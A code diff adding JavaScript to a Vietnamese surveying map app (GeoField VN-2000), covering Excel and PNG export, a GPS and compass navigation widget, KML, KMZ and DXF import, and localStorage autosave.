+    const dh=[["Đỉnh","Longitude","Latitude","E (m)","N (m)","Đoạn (m)","Cộng dồn (m)"]]; let cum=0;
+    data.distance.forEach((p,i)=>{const en=toEN(p.lat,p.lng); let seg=0; if(i>0){seg=distGrid(data.distance[i-1],p); cum+=seg;}
+      dh.push([i+1,+p.lng.toFixed(7),+p.lat.toFixed(7),+en.e.toFixed(3),+en.n.toFixed(3),+seg.toFixed(3),+cum.toFixed(3)]);});
+    dh.push([]); dh.push(["Tổng chiều dài (m)","","","","","",+cum.toFixed(3)]);
+    const ws2=XLSX.utils.aoa_to_sheet(dh); ws2['!cols']=[{wch:8},{wch:14},{wch:14},{wch:14},{wch:14},{wch:12},{wch:14}];
+    XLSX.utils.book_append_sheet(wb,ws2,"KhoangCach");
+  }
+  // area sheet
+  if(data.area.length>=3){
+    const {area,perim}=polyAreaPerim(data.area);
+    const ah=[["Đỉnh","Longitude","Latitude","E (m)","N (m)"]];
+    data.area.forEach((p,i)=>{const en=toEN(p.lat,p.lng); ah.push([i+1,+p.lng.toFixed(7),+p.lat.toFixed(7),+en.e.toFixed(3),+en.n.toFixed(3)]);});
+    ah.push([]); ah.push(["Diện tích (m²)",+area.toFixed(3)]); ah.push(["Diện tích (ha)",+(area/1e4).toFixed(5)]);
+    ah.push(["Diện tích (km²)",+(area/1e6).toFixed(6)]); ah.push(["Chu vi (m)",+perim.toFixed(3)]);
+    const ws3=XLSX.utils.aoa_to_sheet(ah); ws3['!cols']=[{wch:16},{wch:14},{wch:14},{wch:14},{wch:14}];
+    XLSX.utils.book_append_sheet(wb,ws3,"DienTich");
+  }
+  XLSX.writeFile(wb,`geofield_${ts()}.xlsx`);
+  toast('Đã xuất Excel');
+};
+
+/* ---------------- Image (PNG) ---------------- */
+function tileUrlOf(layer,x,y,z){
+  const subs=layer.options.subdomains||'abc';
+  const s=String(subs[(Math.abs(x+y))%subs.length]);
+  return layer._url.replace('{s}',s).replace('{z}',z).replace('{x}',x).replace('{y}',y).replace('{r}','');
+}
+function drawLayerTiles(ctx,layer,zoom,origin,w,h){
+  const T=256, max=1<<zoom;
+  const x0=Math.floor(origin.x/T), x1=Math.floor((origin.x+w)/T);
+  const y0=Math.floor(origin.y/T), y1=Math.floor((origin.y+h)/T);
+  const jobs=[];
+  for(let tx=x0;tx<=x1;tx++)for(let ty=y0;ty<=y1;ty++){
+    if(ty<0||ty>=max) continue;
+    const wx=((tx%max)+max)%max;
+    jobs.push(new Promise(res=>{
+      const im=new Image(); im.crossOrigin='anonymous';
+      im.onload=()=>{ try{ ctx.drawImage(im, tx*T-origin.x, ty*T-origin.y, T, T); res(0); }catch(_){ res(1); } };
+      im.onerror=()=>res(1);
+      im.src=tileUrlOf(layer,wx,ty,zoom);
+    }));
+  }
+  return Promise.all(jobs).then(a=>a.reduce((p,c)=>p+c,0));
+}
+async function exportIMG(){
+  toast('Đang tạo ảnh…');
+  try{
+    const size=map.getSize(), zoom=Math.round(map.getZoom());
+    const origin=map.getPixelBounds().min;
+    const dpr=Math.min(2, window.devicePixelRatio||1);
+    const cv=document.createElement('canvas'); cv.width=size.x*dpr; cv.height=size.y*dpr;
+    const ctx=cv.getContext('2d'); ctx.scale(dpr,dpr);
+    ctx.fillStyle='#0a0f14'; ctx.fillRect(0,0,size.x,size.y);
+    let fail=0;
+    fail+=await drawLayerTiles(ctx,currentBase,zoom,origin,size.x,size.y);
+    if(map.hasLayer(labels)) fail+=await drawLayerTiles(ctx,labels,zoom,origin,size.x,size.y);
+    const cp=p=>map.latLngToContainerPoint(L.latLng(p.lat,p.lng));
+    /* area polygon */
+    if(data.area.length>=2){
+      ctx.beginPath();
+      data.area.forEach((p,i)=>{const q=cp(p); i?ctx.lineTo(q.x,q.y):ctx.moveTo(q.x,q.y);});
+      if(data.area.length>=3){ ctx.closePath(); ctx.fillStyle='rgba(181,140,255,.22)'; ctx.fill(); }
+      ctx.strokeStyle='#b58cff'; ctx.lineWidth=3; ctx.stroke();
+    }
+    /* distance polyline + segment labels */
+    if(data.distance.length>=2){
+      ctx.beginPath();
+      data.distance.forEach((p,i)=>{const q=cp(p); i?ctx.lineTo(q.x,q.y):ctx.moveTo(q.x,q.y);});
+      ctx.strokeStyle='#38c0c9'; ctx.lineWidth=3; ctx.stroke();
+      ctx.font='600 11px sans-serif';
+      for(let i=1;i<data.distance.length;i++){
+        const a=cp(data.distance[i-1]), b=cp(data.distance[i]);
+        const t=distGrid(data.distance[i-1],data.distance[i]).toFixed(1)+' m';
+        const mx=(a.x+b.x)/2, my=(a.y+b.y)/2, tw=ctx.measureText(t).width;
+        ctx.fillStyle='rgba(10,15,20,.78)'; ctx.fillRect(mx-tw/2-4,my-16,tw+8,14);
+        ctx.fillStyle='#7fe3ea'; ctx.textAlign='center'; ctx.fillText(t,mx,my-5);
+      }
+    }
+    /* vertices */
+    const dot=(p,c)=>{const q=cp(p); ctx.beginPath(); ctx.arc(q.x,q.y,4,0,Math.PI*2); ctx.fillStyle=c; ctx.fill(); ctx.strokeStyle='#0a0f14'; ctx.lineWidth=1.5; ctx.stroke();};
+    data.distance.forEach(p=>dot(p,'#38c0c9'));
+    data.area.forEach(p=>dot(p,'#b58cff'));
+    /* points + labels */
+    ctx.font='700 12px sans-serif';
+    data.point.forEach((p,i)=>{
+      const q=cp(p);
+      ctx.beginPath(); ctx.arc(q.x,q.y,7,0,Math.PI*2); ctx.fillStyle='#ffb020'; ctx.fill();
+      ctx.strokeStyle='#1a1204'; ctx.lineWidth=2; ctx.stroke();
+      const t=pName(p,i), tw=ctx.measureText(t).width;
+      ctx.fillStyle='rgba(10,15,20,.82)'; ctx.fillRect(q.x-tw/2-4,q.y-26,tw+8,15);
+      ctx.fillStyle='#ffd47f'; ctx.textAlign='center'; ctx.fillText(t,q.x,q.y-14);
+    });
+    /* area label */
+    if(data.area.length>=3){
+      const {area}=polyAreaPerim(data.area);
+      let cx=0,cy=0; data.area.forEach(p=>{const q=cp(p);cx+=q.x;cy+=q.y;}); cx/=data.area.length; cy/=data.area.length;
+      const t=(area/1e4).toFixed(4)+' ha'; ctx.font='700 13px sans-serif';
+      const tw=ctx.measureText(t).width;
+      ctx.fillStyle='rgba(10,15,20,.8)'; ctx.fillRect(cx-tw/2-5,cy-9,tw+10,18);
+      ctx.fillStyle='#d9c4ff'; ctx.textAlign='center'; ctx.fillText(t,cx,cy+4);
+    }
+    /* title block */
+    const dd=Math.trunc(state.lon0), dm=Math.round((state.lon0-dd)*60);
+    const info=`GeoField VN-2000 · KTT ${dd}°${String(dm).padStart(2,'0')}′ · múi ${state.width}° · ${new Date().toLocaleString('vi-VN')}`;
+    ctx.font='600 12px sans-serif'; ctx.textAlign='left';
+    const iw=ctx.measureText(info).width;
+    ctx.fillStyle='rgba(10,15,20,.85)'; ctx.fillRect(8,8,iw+16,26);
+    ctx.fillStyle='#e7edf3'; ctx.fillText(info,16,25);
+    /* scale bar */
+    const mpp=40075016.686*Math.cos(map.getCenter().lat*Math.PI/180)/Math.pow(2,zoom+8);
+    const L0=mpp*120, p10=Math.pow(10,Math.floor(Math.log10(L0)));
+    let nice=p10; for(const k of [1,2,5,10]){ if(k*p10<=L0) nice=k*p10; }
+    const px=nice/mpp, bx=12, by=size.y-22;
+    ctx.fillStyle='rgba(10,15,20,.8)'; ctx.fillRect(bx-4,by-16,px+60,26);
+    ctx.strokeStyle='#fff'; ctx.lineWidth=2;
+    ctx.beginPath(); ctx.moveTo(bx,by); ctx.lineTo(bx+px,by); ctx.moveTo(bx,by-5); ctx.lineTo(bx,by+3); ctx.moveTo(bx+px,by-5); ctx.lineTo(bx+px,by+3); ctx.stroke();
+    ctx.fillStyle='#fff'; ctx.font='600 11px sans-serif'; ctx.textAlign='left';
+    ctx.fillText(nice>=1000? (nice/1000)+' km' : nice+' m', bx+px+7, by+3);
+    /* north arrow */
+    const nx=size.x-26, ny=34;
+    ctx.fillStyle='rgba(10,15,20,.8)'; ctx.beginPath(); ctx.arc(nx,ny,17,0,Math.PI*2); ctx.fill();
+    ctx.fillStyle='#ff5d5d'; ctx.beginPath(); ctx.moveTo(nx,ny-12); ctx.lineTo(nx-6,ny+7); ctx.lineTo(nx+6,ny+7); ctx.closePath(); ctx.fill();
+    ctx.fillStyle='#fff'; ctx.font='700 10px sans-serif'; ctx.textAlign='center'; ctx.fillText('N',nx,ny+16);
+    if(fail>0) toast(`Ảnh thiếu ${fail} ô nền (lớp nền chặn CORS) — nên dùng lớp Esri/OSM`);
+    cv.toBlob(b=>{
+      if(!b){ toast('Không tạo được ảnh — dùng lớp Esri/OSM rồi thử lại'); return; }
+      download(`geofield_${ts()}.png`, b, 'image/png'); toast('Đã xuất ảnh PNG');
+    },'image/png');
+  }catch(ex){ toast('Lỗi tạo ảnh: '+(ex&&ex.message||ex)); }
+}
+
+/* ============================================================
+   Navigation / compass ("Dẫn đường")
+   ============================================================ */
+const nav = { target:null, cur:null, heading:null, hasHeading:false, watchId:null, orientH:null, built:false };
+const WINDS=['B','ĐB','Đ','ĐN','N','TN','T','TB'];
+function windName(b){ return WINDS[Math.round(b/45)%8]; }
+function bearing(a,b){
+  const R=Math.PI/180, p1=a.lat*R, p2=b.lat*R, dl=(b.lng-a.lng)*R;
+  const y=Math.sin(dl)*Math.cos(p2);
+  const x=Math.cos(p1)*Math.sin(p2)-Math.sin(p1)*Math.cos(p2)*Math.cos(dl);
+  return (Math.atan2(y,x)*180/Math.PI+360)%360;
+}
+function enNE(lat,lng){ const en=toEN(lat,lng); return `N ${en.n.toFixed(2)}   E ${en.e.toFixed(2)}`; }
+
+function buildCompass(){
+  if(nav.built) return; nav.built=true;
+  const cx=150,cy=150,R=132; let h='';
+  for(let a=0;a<360;a+=5){
+    const rad=(a-90)*Math.PI/180, major=(a%45===0);
+    const r2=R-(major?16:9);
+    h+=`<line x1="${(cx+R*Math.cos(rad)).toFixed(1)}" y1="${(cy+R*Math.sin(rad)).toFixed(1)}" x2="${(cx+r2*Math.cos(rad)).toFixed(1)}" y2="${(cy+r2*Math.sin(rad)).toFixed(1)}" stroke="${major?'#ffffff':'#66748a'}" stroke-width="${major?2:1}"/>`;
+  }
+  [['N',0,'#ff5d5d'],['Đ',90,'#e7edf3'],['S',180,'#e7edf3'],['T',270,'#e7edf3']].forEach(([t,a,c])=>{
+    const rad=(a-90)*Math.PI/180, rr=R-32;
+    h+=`<text x="${(cx+rr*Math.cos(rad)).toFixed(1)}" y="${(cy+rr*Math.sin(rad)+7).toFixed(1)}" text-anchor="middle" fill="${c}" font-size="22" font-weight="700" font-family="var(--sans)">${t}</text>`;
+  });
+  document.getElementById('navRing').innerHTML=h;
+}
+
+function fillNavTargets(){
+  const sel=document.getElementById('nav-target'); sel.innerHTML='';
+  const o0=document.createElement('option'); o0.value=''; o0.textContent='— chọn điểm đích —'; sel.appendChild(o0);
+  data.point.forEach((p,i)=>{ const en=toEN(p.lat,p.lng);
+    const o=document.createElement('option'); o.value='p:'+i; o.textContent=`${pName(p,i)}  ·  N ${en.n.toFixed(0)} E ${en.e.toFixed(0)}`; sel.appendChild(o); });
+  const oc=document.createElement('option'); oc.value='center'; oc.textContent='Tâm bản đồ hiện tại'; sel.appendChild(oc);
+}
+
+function setTargetLatLng(lat,lng,label){ nav.target={lat,lng,label:label||''}; document.getElementById('nav-bearing').textContent='Đang tính hướng…'; renderNav(); }
+
+document.getElementById('nav-target').addEventListener('change',e=>{
+  const v=e.target.value;
+  if(!v){ nav.target=null; renderNav(); return; }
+  if(v==='center'){ const c=map.getCenter(); setTargetLatLng(c.lat,c.lng,'Tâm bản đồ'); return; }
+  if(v.startsWith('p:')){ const i=+v.slice(2), p=data.point[i];
+    if(p){ setTargetLatLng(p.lat,p.lng,pName(p,i));
+      if(p.h!=null){ document.getElementById('nav-z-target').value=p.h; recomputeDH(); } } }
+});
+document.getElementById('nav-set-en').onclick=()=>{
+  const m=document.getElementById('nav-target-en').value.trim().split(/[,\s]+/).map(Number).filter(x=>!isNaN(x));
+  if(m.length<2){ toast('Nhập E, N cách nhau bởi dấu phẩy'); return; }
+  const ll=toLL(m[0],m[1]); setTargetLatLng(ll.lat,ll.lng,'Đích nhập tay'); document.getElementById('nav-target').value='';
+  toast('Đã đặt điểm đích theo E, N');
+};
+
+/* elevation */
+function recomputeDH(){
+  const zs=parseFloat(document.getElementById('nav-z-stand').value);
+  const zt=parseFloat(document.getElementById('nav-z-target').value);
+  const el=document.getElementById('nav-dh'), note=document.getElementById('nav-dh-note');
+  if(typeof saveState==='function') saveState();
+  if(isNaN(zs)||isNaN(zt)){ el.textContent='ΔH —'; note.textContent='Nhập cả hai cao độ để tính chênh cao.'; return; }
+  const dh=zt-zs;
+  el.textContent=`ΔH = ${dh>=0?'+':''}${dh.toFixed(3)} m`;
+  note.textContent = Math.abs(dh)<1e-6?'Hai điểm cùng cao độ.':(dh>0?'Điểm đích cao hơn vị trí đứng.':'Điểm đích thấp hơn vị trí đứng.');
+}
+document.getElementById('nav-z-stand').addEventListener('input',recomputeDH);
+document.getElementById('nav-z-target').addEventListener('input',recomputeDH);
+document.getElementById('nav-z-gps').onclick=()=>{
+  if(nav.cur && nav.cur.alt!=null && !isNaN(nav.cur.alt)){ document.getElementById('nav-z-stand').value=nav.cur.alt.toFixed(3); recomputeDH(); toast('Đã lấy cao độ GPS (độ tin cậy thấp)'); }
+  else toast('GPS chưa cung cấp cao độ');
+};
+
+/* draw my position + line to target on the map */
+function drawNavMap(){
+  gNav.clearLayers();
+  if(nav.cur){
+    L.circle([nav.cur.lat,nav.cur.lng],{radius:nav.cur.acc||0,color:'#2f81c9',weight:1,fillColor:'#2f81c9',fillOpacity:.12}).addTo(gNav);
+    L.circleMarker([nav.cur.lat,nav.cur.lng],{radius:7,color:'#fff',weight:2,fillColor:'#2f81c9',fillOpacity:1}).addTo(gNav);
+  }
+  if(nav.target){
+    L.circleMarker([nav.target.lat,nav.target.lng],{radius:9,color:'#ff5d5d',weight:2,fillColor:'#ff5d5d',fillOpacity:.35}).addTo(gNav);
+  }
+  if(nav.cur&&nav.target){
+    L.polyline([[nav.cur.lat,nav.cur.lng],[nav.target.lat,nav.target.lng]],{color:'#ff5d5d',weight:2,dashArray:'6,6',opacity:.9}).addTo(gNav);
+  }
+}
+
+/* render loop */
+function renderNav(){
+  drawNavMap();
+  document.getElementById('nw-title').textContent = nav.target? ('🧭 '+(nav.target.label||'Dẫn đường')) : '🧭 Dẫn đường';
+  document.getElementById('navRing').setAttribute('transform',`rotate(${(-(nav.heading||0)).toFixed(1)} 150 150)`);
+  // gps chip
+  const chip=document.getElementById('nav-gps'), txt=document.getElementById('nav-gps-txt');
+  chip.classList.remove('good','mid');
+  if(nav.cur){ const a=nav.cur.acc;
+    if(a<=10) chip.classList.add('good'); else if(a<=30) chip.classList.add('mid');
+    txt.textContent=`GPS ±${a.toFixed(0)} m`;
+    document.getElementById('nav-acc').textContent=`± ${a.toFixed(0)} m`;
+    document.getElementById('nav-cur').textContent=enNE(nav.cur.lat,nav.cur.lng);
+  } else { txt.textContent='Đang lấy GPS…'; }
+
+  const dEl=document.getElementById('navDist'), uEl=document.getElementById('navUnit');
+  const arrow=document.getElementById('navArrow');
+  if(nav.target){ document.getElementById('nav-tgt').textContent=enNE(nav.target.lat,nav.target.lng); }
+  else { document.getElementById('nav-tgt').textContent='—'; }
+
+  if(!nav.cur || !nav.target){ dEl.textContent='—'; uEl.textContent='m'; arrow.style.opacity=nav.target?'.35':'.2';
+    if(!nav.target) document.getElementById('nav-bearing').textContent='Chọn điểm đích để bắt đầu dẫn đường.';
+    else if(!nav.cur) document.getElementById('nav-bearing').textContent='Đang chờ định vị GPS…';
+    return; }
+
+  arrow.style.opacity='1';
+  const d=distGrid(nav.cur,nav.target);
+  if(d>=1000){ dEl.textContent=(d/1000).toFixed(2); dEl.setAttribute('font-size','22'); uEl.textContent='km'; }
+  else { dEl.textContent=d.toFixed(0); dEl.setAttribute('font-size','26'); uEl.textContent='m'; }
+  const brg=bearing(nav.cur,nav.target);
+  arrow.setAttribute('transform',`rotate(${(brg-(nav.heading||0)).toFixed(1)} 150 150)`);
+  document.getElementById('nav-bearing').innerHTML=
+    `Hướng tới đích <b>${brg.toFixed(0)}°</b> (${windName(brg)}) · còn <b>${d.toFixed(1)} m</b>`
+    + (nav.hasHeading?'':' <br><span style="color:var(--muted)">La bàn thiết bị chưa bật — kim chỉ theo hướng Bắc thực.</span>');
+}
+
+/* sensors */
+function startOrientation(){
+  function handle(e){
+    let h=null;
+    if(e.webkitCompassHeading!=null) h=e.webkitCompassHeading;
+    else if(e.alpha!=null){
+      h=360-e.alpha;
+      const sa=(screen.orientation&&screen.orientation.angle)||window.orientation||0;
+      h=(h+sa)%360;
+    }
+    if(h!=null){ nav.heading=(h+360)%360; nav.hasHeading=true; renderNav(); }
+  }
+  nav.orientH=handle;
+  if(typeof DeviceOrientationEvent!=='undefined' && typeof DeviceOrientationEvent.requestPermission==='function'){
+    DeviceOrientationEvent.requestPermission().then(s=>{ if(s==='granted') window.addEventListener('deviceorientation',handle,true); }).catch(()=>{});
+  } else {
+    window.addEventListener('deviceorientationabsolute',handle,true);
+    window.addEventListener('deviceorientation',handle,true);
+  }
+}
+function stopOrientation(){
+  if(nav.orientH){ window.removeEventListener('deviceorientation',nav.orientH,true); window.removeEventListener('deviceorientationabsolute',nav.orientH,true); nav.orientH=null; }
+}
+function startWatch(){
+  if(!navigator.geolocation){ toast('Trình duyệt không hỗ trợ định vị'); return; }
+  if(!window.isSecureContext){ document.getElementById('nav-gps-txt').textContent='Cần HTTPS'; toast('⚠️ Cần chạy qua HTTPS — iPhone chặn GPS khi mở bằng file:// hoặc http://'); return; }
+  nav.watchId=navigator.geolocation.watchPosition(p=>{
+    nav.cur={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude};
+    renderNav();
+  },err=>{ document.getElementById('nav-gps-txt').textContent='Lỗi GPS'; toast(!window.isSecureContext?'⚠️ Cần chạy qua HTTPS thì iPhone mới cho phép GPS':'Không lấy được vị trí GPS'); },
+  {enableHighAccuracy:true,maximumAge:1000,timeout:20000});
+}
+function stopWatch(){ if(nav.watchId!=null){ navigator.geolocation.clearWatch(nav.watchId); nav.watchId=null; } }
+
+function openNav(){
+  buildCompass(); fillNavTargets(); recomputeDH();
+  const w=document.getElementById('navWidget');
+  w.classList.add('open');
+  // open settings drawer if no target yet, to guide selection
+  const drawer=document.getElementById('nav-drawer'), sbtn=document.getElementById('nav-settings');
+  if(!nav.target){ drawer.style.display='flex'; sbtn.classList.add('on'); }
+  startWatch(); startOrientation(); renderNav();
+}
+function closeNav(){ document.getElementById('navWidget').classList.remove('open'); stopWatch(); stopOrientation(); gNav.clearLayers(); }
+document.getElementById('fab-nav').onclick=openNav;
+document.getElementById('nav-close').onclick=closeNav;
+
+document.getElementById('nav-settings').onclick=function(){
+  const d=document.getElementById('nav-drawer');
+  const show=!(d.style.display==='flex');
+  d.style.display=show?'flex':'none';
+  this.classList.toggle('on',show);
+};
+
+/* draggable widget */
+(function(){
+  const w=document.getElementById('navWidget'), h=document.getElementById('nw-head');
+  let drag=false,sx,sy,ox,oy;
+  h.addEventListener('pointerdown',e=>{
+    if(e.target.closest('.nw-btn')) return;
+    drag=true; const r=w.getBoundingClientRect(); ox=r.left; oy=r.top; sx=e.clientX; sy=e.clientY;
+    w.style.left=ox+'px'; w.style.top=oy+'px'; w.style.right='auto'; w.style.bottom='auto';
+    try{ h.setPointerCapture(e.pointerId); }catch(_){}
+  });
+  h.addEventListener('pointermove',e=>{
+    if(!drag) return;
+    let nx=ox+(e.clientX-sx), ny=oy+(e.clientY-sy);
+    nx=Math.max(4,Math.min(window.innerWidth-w.offsetWidth-4,nx));
+    ny=Math.max(4,Math.min(window.innerHeight-h.offsetHeight-4,ny));
+    w.style.left=nx+'px'; w.style.top=ny+'px';
+  });
+  h.addEventListener('pointerup',()=>drag=false);
+  h.addEventListener('pointercancel',()=>drag=false);
+})();
+
+/* ============================================================
+   Import KML / KMZ / DXF (CAD)  ->  gImport overlay
+   ============================================================ */
+function fitToImported(){
+  if(!imported.length){ toast('Chưa có dữ liệu đã nhập'); return; }
+  const lls=[]; imported.forEach(f=>f.pts.forEach(p=>lls.push([p.lat,p.lng])));
+  if(lls.length) map.fitBounds(L.latLngBounds(lls).pad(0.15));
+}
+function clearImported(){ imported=[]; renderImport(); if(typeof saveState==='function') saveState(); toast('Đã xóa dữ liệu đã nhập'); }
+
+/* --- KML text -> features (WGS84 lon,lat) --- */
+function parseKMLText(text, srcName){
+  const feats=[]; let doc;
+  try{ doc=new DOMParser().parseFromString(text,'text/xml'); }catch(_){ return feats; }
+  if(doc.getElementsByTagName('parsererror').length) return feats;
+  const parseCoords=str=> String(str).trim().split(/\s+/).map(tok=>{
+    const a=tok.split(',').map(Number); return {lng:a[0], lat:a[1]};
+  }).filter(p=>isFinite(p.lat)&&isFinite(p.lng)&&Math.abs(p.lat)<=90&&Math.abs(p.lng)<=180);
+  const pms=doc.getElementsByTagName('Placemark');
+  for(let i=0;i<pms.length;i++){
+    const pm=pms[i];
+    const nmEl=pm.getElementsByTagName('name')[0];
+    const nm=nmEl? nmEl.textContent.trim():'';
+    const pts=pm.getElementsByTagName('Point');
+    for(let j=0;j<pts.length;j++){ const c=pts[j].getElementsByTagName('coordinates')[0]; if(!c) continue;
+      const arr=parseCoords(c.textContent); if(arr.length) feats.push({kind:'point',name:nm,pts:[arr[0]],src:srcName}); }
+    const lns=pm.getElementsByTagName('LineString');
+    for(let j=0;j<lns.length;j++){ const c=lns[j].getElementsByTagName('coordinates')[0]; if(!c) continue;
+      const arr=parseCoords(c.textContent); if(arr.length>=2) feats.push({kind:'line',name:nm,pts:arr,src:srcName}); }
+    const pgs=pm.getElementsByTagName('Polygon');
+    for(let j=0;j<pgs.length;j++){
+      const ob=pgs[j].getElementsByTagName('outerBoundaryIs')[0]||pgs[j];
+      const c=ob.getElementsByTagName('coordinates')[0]; if(!c) continue;
+      let arr=parseCoords(c.textContent);
+      if(arr.length>=2 && arr[0].lat===arr[arr.length-1].lat && arr[0].lng===arr[arr.length-1].lng) arr=arr.slice(0,-1);
+      if(arr.length>=3) feats.push({kind:'polygon',name:nm,pts:arr,src:srcName});
+    }
+  }
+  return feats;
+}
+
+/* --- DXF text -> features. Assumes E,N in current VN-2000 KTT/zone. --- */
+function parseDXFText(text, srcName){
+  const feats=[]; const raw=text.split(/\r\n|\r|\n/);
+  const pairs=[];
+  for(let i=0;i+1<raw.length;i+=2){ const code=parseInt(raw[i],10);
+    if(isNaN(code)) continue; pairs.push([code, raw[i+1]!==undefined? raw[i+1].trim():'']); }
+  const toll=(e,n)=>{ try{ const ll=toLL(e,n); if(isFinite(ll.lat)&&isFinite(ll.lng)&&Math.abs(ll.lat)<=90&&Math.abs(ll.lng)<=180) return {lat:ll.lat,lng:ll.lng}; }catch(_){} return null; };
+  const ENT=new Set(['POINT','LINE','LWPOLYLINE','POLYLINE','CIRCLE','TEXT','MTEXT']);
+  let ent=null;
+  const flush=()=>{
+    if(!ent) return; const t=ent.type;
+    if(t==='POINT'||t==='TEXT'||t==='MTEXT'){
+      if(ent.xs.length){ const q=toll(ent.xs[0],ent.ys[0]); if(q) feats.push({kind:'point',name:ent.text||'',pts:[q],src:srcName}); }
+    } else if(t==='LINE'){
+      if(ent.xs.length>=2){ const a=toll(ent.xs[0],ent.ys[0]), b=toll(ent.xs[1],ent.ys[1]); if(a&&b) feats.push({kind:'line',name:'',pts:[a,b],src:srcName}); }
+    } else if(t==='LWPOLYLINE'||t==='POLYLINE'){
+      const pts=[]; for(let k=0;k<ent.xs.length;k++){ const q=toll(ent.xs[k],ent.ys[k]); if(q) pts.push(q); }
+      if(pts.length>=2){ if(ent.closed && pts.length>=3) feats.push({kind:'polygon',name:'',pts,src:srcName});
+        else feats.push({kind:'line',name:'',pts,src:srcName}); }
+    } else if(t==='CIRCLE'){
+      if(ent.xs.length && ent.r>0){ const seg=36, cx=ent.xs[0], cy=ent.ys[0], r=ent.r, pts=[];
+        for(let a=0;a<seg;a++){ const q=toll(cx+r*Math.cos(a/seg*2*Math.PI), cy+r*Math.sin(a/seg*2*Math.PI)); if(q) pts.push(q); }
+        if(pts.length>=3) feats.push({kind:'polygon',name:'',pts,src:srcName}); }
+    }
+    ent=null;
+  };
+  for(let i=0;i<pairs.length;i++){
+    const code=pairs[i][0], val=pairs[i][1];
+    if(code===0){
+      if(val==='VERTEX' && ent && ent.type==='POLYLINE'){ ent._vtx=true; continue; }
+      if(val==='SEQEND') continue;
+      flush();
+      ent = ENT.has(val)? {type:val,xs:[],ys:[],closed:false,text:'',r:0,_vtx:false} : null;
+      continue;
+    }
+    if(!ent) continue;
+    if(code===10){ if(ent.type==='POLYLINE' && !ent._vtx){} else ent.xs.push(parseFloat(val)); }
+    else if(code===20){ if(ent.type==='POLYLINE' && !ent._vtx){} else ent.ys.push(parseFloat(val)); }
+    else if(code===40 && ent.type==='CIRCLE'){ ent.r=parseFloat(val)||0; }
+    else if(code===70){ const f=parseInt(val,10)||0; if((f&1)===1) ent.closed=true; }
+    else if(code===1){ ent.text=val; }
+  }
+  flush();
+  return feats;
+}
+
+async function importFiles(fileList){
+  const files=Array.from(fileList||[]); if(!files.length) return;
+  let added=0, nFiles=0;
+  for(const file of files){
+    const ext=(file.name.split('.').pop()||'').toLowerCase();
+    try{
+      let f=[];
+      if(ext==='kml'){ f=parseKMLText(await file.text(), file.name); }
+      else if(ext==='kmz'){
+        if(typeof JSZip==='undefined'){ toast('Chưa tải được thư viện giải nén KMZ (cần mạng)'); continue; }
+        const zip=await JSZip.loadAsync(await file.arrayBuffer());
+        const names=Object.keys(zip.files);
+        const kmlName=names.find(n=>/doc\.kml$/i.test(n)) || names.find(n=>/\.kml$/i.test(n));
+        if(!kmlName){ toast('KMZ không chứa tệp .kml'); continue; }
+        f=parseKMLText(await zip.files[kmlName].async('string'), file.name);
+      }
+      else if(ext==='dxf'){ f=parseDXFText(await file.text(), file.name); }
+      else { toast('Định dạng chưa hỗ trợ: .'+ext); continue; }
+      imported.push(...f); added+=f.length; nFiles++;
+    }catch(err){ toast('Lỗi đọc '+file.name+': '+(err&&err.message||err)); }
+  }
+  renderImport(); if(typeof saveState==='function') saveState();
+  if(added){ toast(`Đã nhập ${added} đối tượng từ ${nFiles} tệp`); fitToImported(); }
+  else toast('Không tìm thấy đối tượng hợp lệ (kiểm tra KTT với DXF)');
+}
+document.getElementById('rb-import').onclick=()=>document.getElementById('import-file').click();
+document.getElementById('import-file').addEventListener('change',e=>{ importFiles(e.target.files); e.target.value=''; });
+document.getElementById('rb-fit').onclick=fitToImported;
+document.getElementById('rb-import-clear').onclick=clearImported;
+
+/* ============================================================
+   Mobile compact toolbar (big mode buttons + icon sheets)
+   ============================================================ */
+(function(){
+  const body=document.querySelector('.rb-body');
+  if(!body) return;
+  function closeSheets(){
+    body.classList.remove('show-crs','show-import','show-export');
+    document.querySelectorAll('.rb-mact').forEach(b=>b.classList.remove('on'));
+  }
+  document.querySelectorAll('.rb-mact[data-sheet]').forEach(btn=>{
+    btn.addEventListener('click',e=>{
+      e.stopPropagation();
+      const cls='show-'+btn.dataset.sheet, was=body.classList.contains(cls);
+      closeSheets();
+      if(!was){ body.classList.add(cls); btn.classList.add('on'); }
+    });
+  });
+  const navB=document.getElementById('mact-nav'), locB=document.getElementById('mact-loc');
+  if(navB) navB.onclick=e=>{ e.stopPropagation(); closeSheets(); openNav(); };
+  if(locB) locB.onclick=e=>{ e.stopPropagation(); closeSheets(); document.getElementById('fab-loc').click(); };
+  // close a sheet after picking export / import action
+  document.getElementById('rb-export').addEventListener('click',()=>setTimeout(closeSheets,60));
+  document.getElementById('rb-import').addEventListener('click',()=>setTimeout(closeSheets,60));
+  // close when interacting with the map or tapping outside the toolbar
+  map.on('click',closeSheets);
+  document.addEventListener('click',e=>{ if(!e.target.closest('.rb-body')) closeSheets(); });
+})();
+
+/* ============================================================
+   Autosave (localStorage)
+   ============================================================ */
+const LSKEY='geofield_pro_v1';
+let saveT=null;
+function saveState(){
+  clearTimeout(saveT);
+  saveT=setTimeout(()=>{
+    try{
+      const c=map.getCenter();
+      localStorage.setItem(LSKEY, JSON.stringify({
+        data,
+        imported,
+        deg:document.getElementById('rb-deg').value,
+        min:document.getElementById('rb-min').value,
+        width:state.width,
+        zs:document.getElementById('nav-z-stand').value,
+        zt:document.getElementById('nav-z-target').value,
+        view:{lat:c.lat,lng:c.lng,z:map.getZoom()}
+      }));
+    }catch(_){}
+  },400);
+}
+function loadState(){
+  try{
+    const raw=localStorage.getItem(LSKEY); if(!raw){ document.getElementById('helpModal').classList.add('show'); return; }
+    const s=JSON.parse(raw); if(!s) return;
+    if(s.data){ ['point','distance','area'].forEach(k=>{ if(Array.isArray(s.data[k])) data[k]=s.data[k]; }); }
+    if(Array.isArray(s.imported)) imported=s.imported;
+    if(s.deg!=null) document.getElementById('rb-deg').value=s.deg;
+    if(s.min!=null) document.getElementById('rb-min').value=s.min;
+    if(+s.width===6){ const r=document.querySelector('input[name=zone][value="6"]'); if(r) r.checked=true; }
+    if(s.zs) document.getElementById('nav-z-stand').value=s.zs;
+    if(s.zt) document.getElementById('nav-z-target').value=s.zt;
+    if(s.view) map.setView([s.view.lat,s.view.lng], s.view.z||13);
+  }catch(_){}
+}
+map.on('moveend', saveState);
+
+/* ============================================================
+   Init
+   ============================================================ */
+loadState(); initCRS(); syncRibbonH(); updateReadout(); renderAll();
+setTimeout(()=>{ openPanel(false); syncPanelH(); },300);   /* mặc định đóng bảng chi tiết */
